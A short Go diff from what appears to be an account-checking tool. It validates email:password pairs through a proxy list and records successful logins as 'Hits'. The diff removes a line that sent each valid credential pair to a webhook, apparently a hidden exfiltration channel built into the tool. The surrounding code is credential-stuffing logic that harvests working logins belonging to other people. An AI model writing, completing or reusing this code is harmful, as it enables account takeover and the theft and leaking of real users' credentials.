@@ -341,7 +341,6 @@ func Worker(account fileio.Account, proxylist *[]string) {
 
 				hitLine := fmt.Sprintf("%s:%s", account.Email, account.Password)
 				monitor.SaveAccount(hitLine, "Hits")
-				go sendToWebhook(HitsURL, hitLine)
 				mu.Lock()
 				monitor.Checked += 1
 				monitor.Hits += 1
